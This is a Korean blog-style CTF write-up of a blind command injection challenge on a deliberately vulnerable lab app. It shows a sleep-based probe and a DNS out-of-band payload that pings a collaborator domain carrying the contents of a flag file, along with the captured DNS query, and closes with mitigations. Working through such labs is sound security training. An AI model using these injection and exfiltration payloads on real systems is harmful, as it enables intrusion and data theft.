+++
title = "VulnABLE CTF [LUXORA]: Command Injection 🥇 Gold (Blind & Out-of-Band)"
description = "LUXORA 플랫폼의 Blind Command Injection 플래그 획득 시나리오 및 Out-of-Band(OOB) 추출 기법 분석"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Command Injection", "Gold", "OOB", "Blind"]
+++

# VulnABLE CTF [LUXORA]: Command Injection 🥇 Gold

Silver 난이도까지는 명령어를 실행하면 그 결과가 즉시 화면에 출력되었습니다. 하지만 **Gold 난이도**인 `/cmdi/gold` 라우트에서는 명령어의 실행 결과가 화면에 전혀 출력되지 않는 **Blind Command Injection** 환경이 주어집니다.

눈을 가린 상태에서 어떻게 서버 내부의 데이터를 빼낼 수 있을까요? 외부 통신을 이용하는 **OOB (Out-of-Band) 추출 기법**을 배워보겠습니다.

---

## 🕒 1. 타겟 탐색 및 반응 분석 (Reconnaissance)

`/cmdi/gold` 는 사용자 의견을 서버의 로그 파일로 전송해주는 기능입니다.
* `POST /cmdi/gold` (data: `message=hello`)
* 응답: `Message saved to log successfully.` (무엇을 입력하든 동일한 응답만 반환)

**[해커의 사고 과정]**
* 입력값이 쉘로 넘어가는지 확인하려면 **시간 지연(Time Delay)**을 유발해보자.
* 페이로드: `hello; sleep 5`
* 결과: 서버가 정확히 **5초 뒤에** `Message saved...` 응답을 줍니다. 
* 결론: Blind Command Injection 취약점이 확실히 존재합니다!

---

## 🕒 2. 데이터 추출 전략 설계 (Out-of-Band 기법)

화면에 결과를 띄워주지 않으니, 서버가 스스로 나에게 전화를 걸게(통신하게) 만들어야 합니다. 서버 내부의 `flag` 내용을 읽어서 외부(해커 서버)로 보내도록 명령어를 조합합니다.

### 💡 활용 가능한 OOB 명령어
리눅스 서버에 기본적으로 설치되어 있는 네트워크 도구들을 활용합니다.
1. `curl` 또는 `wget` (HTTP 요청)
2. `ping` (ICMP 또는 DNS 요청)
3. `nc` (Netcat)

이번 시나리오에서는 **DNS 기반의 데이터 유출(DNS Exfiltration)**을 사용해보겠습니다. (웹 요청(`curl`)은 방화벽(Outbound rule)에 막히기 쉽지만, DNS 요청은 보통 뚫려있는 경우가 많기 때문입니다.)

### 🚀 페이로드 조립 (DNS OOB)
해커가 통제하는 도메인(예: `burpcollaborator.net` 또는 `interact.sh`)의 서브도메인으로 플래그를 붙여서 ping을 치게 만듭니다.

* 리눅스 쉘 명령어: `ping -c 1 $(cat flag_gold.txt).해커도메인.com`
* 백틱(`)을 사용한 대체 명령어: `ping -c 1 \`cat flag_gold.txt\`.해커도메인.com`

---

## 🕒 3. 공격 수행 및 PoC (Exploitation)

저는 OOB 테스트를 위해 임시 도메인을 발급해주는 서비스(Burp Collaborator 또는 RequestBin)를 사용하여 `abc123xyz.burpcollaborator.net` 이라는 도메인을 얻어두었습니다.

```http
# 페이로드 전송 (백틱 사용)
POST /cmdi/gold
message=test; ping -c 1 `cat flag_gold.txt`.abc123xyz.burpcollaborator.net
```

### 🔍 공격 결과
서버는 화면에 그저 `Message saved to log successfully.` 라고만 응답합니다.
하지만 해커의 OOB 리스너 서버(Burp Collaborator) 로그를 확인해보면 다음과 같은 DNS 질의(Query)가 도착해 있습니다.

```text
[DNS Query Received]
Type: A
Domain: FLAG{CMDI_🥇_BLIND_OOB_E5F6G7}.abc123xyz.burpcollaborator.net
Source IP: 10.10.10.10
```

타겟 서버가 `cat flag_gold.txt`를 먼저 실행하고, 그 결과값(`FLAG{...}`)을 도메인 이름의 일부로 만들어서 DNS 서버(우리)에게 "이 도메인의 IP가 뭐냐?"고 물어보면서 자연스럽게 플래그를 유출한 것입니다!

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{CMDI_🥇_BLIND_OOB_E5F6G7}`

### 📝 왜 이런 공격이 성공했는가?
Command Injection 취약점 자체는 동일하지만, 서버의 아웃바운드(Outbound) 정책이 열려있었기 때문입니다. 특히 DNS 쿼리(포트 53)는 도메인 해석을 위해 대부분의 서버에서 방화벽을 통과하도록 허용되어 있어, 해커들이 데이터를 빼돌리는 가장 은밀하고 강력한 우회로로 자주 사용됩니다.

### 🛡️ 방어 대책 (Mitigation)
1. **OS 명령어 호출 금지**: Blind 상태라도 취약점 원인은 동일합니다. `exec` 류의 함수를 쓰지 마세요.
2. **강력한 Egress 방화벽(Outbound Filtering) 설정**: 서버는 외부 인터넷으로 마음대로 통신할 수 있어서는 안 됩니다. 
   * 웹 서버가 외부와 통신해야 한다면 허용된 IP/도메인만 통과시키도록 화이트리스트로 방화벽을 설정합니다.
   * 내부망의 DNS 서버만 바라보게 하고, 알 수 없는 외부 도메인에 대한 질의를 차단해야 합니다.

다음은 백엔드의 보호뿐만 아니라 필터 체이닝을 깨부수는 **Platinum 💎 난이도**를 다루겠습니다!